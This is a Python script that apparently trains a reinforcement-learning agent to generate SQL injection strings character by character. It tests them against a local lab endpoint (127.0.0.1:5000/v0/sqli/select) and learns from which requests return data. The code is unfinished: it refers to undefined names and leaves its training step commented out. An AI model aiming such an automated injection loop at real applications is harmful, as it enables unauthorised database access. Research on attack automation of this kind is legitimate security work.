#!/usr/bin/env python3
import dqnagent
import state
import numpy as np
import requests
import argparse
import json
import sys
from collections import deque

parser = argparse.ArgumentParser()
parser.add_argument("--supervise", help="Perform supervised learning with argument as file")
parser.add_argument("--batchsize", help="Training batch size", default=32)
parser.add_argument("--epochs", help="num epochs", default=10)
parser.add_argument("--tensorboard", help="enable tensorboard", action='store_true')
parser.add_argument("model")
args = parser.parse_args()

filename = args.model

#TODO: Hyperparameter.
#This is the maxmimum length of our query string
input_len = 30
context_len = 5
max_qstringlen = 140

agent = dqnagent.Agent(input_len=input_len, context_len=context_len)
agent.load(filename)

if args.supervise != None:
    types = args.supervise.split(',')
    for rounds in range(500):
        contents = []
        [contents.extend(v(int(args.trainscale))) for k,v in supervising_types.items() if k in types]
        if not contents:
            print("cannot supervise on types: {0}\nvalid types are {1}".format(
                types, supervising_types.keys()))
            sys.exit(1)
        print("-" * 20)
        print("\tRound " + str(rounds))
        agent.train_batch(contents, int(args.batchsize), int(args.epochs), args.tensorboard)
        agent.save(filename)

    print("Finished supervising.")
    agent.save(filename)
else:
    table = state.State()
    failed_attempts = {}
    queries = set()
    while True:
        #Iterate through the state table and try to add on to each item in there (plus the empty string)
        for context in table:
            value = table.value()

            qstring = ""
            input_state = ""
            experience = dqnagent.Experience()
            #Predict a character until it produces an end-of-string character (|) or it reaches the max length
            while not qstring.endswith("|") and len(qstring) < max_qstringlen:
                #Shrink our query down to length input_len
                input_state = qstring[-input_len:]
                attempts = []
                if (input_state, context) in failed_attempts:
                    attempts = failed_attempts[input_state, context]
                action = agent.act(input_state, context, attempts)
                experience.add(input_state, context, attempts, action)
                qstring += action

            #Remove the trailing bar, it's not actually supposed to be sent
            chopped = qstring
            if qstring.endswith("|"):
                chopped = qstring[:-1]

            # Is this a repeat or blank?
            repeat = qstring in queries or (chopped.split("%")[0][-1:] == "'")
            queries.add(qstring)

            success = False
            if not repeat:
                #Perform the action
                param = {"user_id": chopped}
                req = requests.get("http://127.0.0.1:5000/v0/sqli/select", params=param)
                success = req.status_code == 200 and (len(req.text) >2)

            #If the query was successful, update the state table
            if success:
                print("Got a hit!", qstring)
                lastchar = chopped.split("%")[0][-1:]
                table.update(context+lastchar)
                #Find out what reward we received
                value_new = table.value()
                reward = value_new - value

            #Learn from how that action performed
            # attempts = []
            # if (input_state, context) in failed_attempts:
            #     attempts = failed_attempts[input_state, context]
            # agent.train_single(qstring[-1], context, input_state, attempts, reward)
            #agent.train_experience(experience, success)

            else:
                # Add the character we just tried to the list of failures
                #   So that we can use it as input in later attempts
                lastchar = chopped.split("%")[0][-1:]
                guess_state = chopped.split("%")[0][:-1][-input_len:]
                print("Incorrect: ", qstring)
                if (guess_state, context) in failed_attempts:
                    failures = failed_attempts[guess_state, context]
                    if lastchar not in failures:
                        failures.extend(lastchar)
                        failed_attempts[guess_state, context] = failures
                # Add this character to the list of failures
                #   Unless this was just a repeat. In which case ignore it
                elif not repeat:
                    failed_attempts[guess_state, context] = [lastchar]
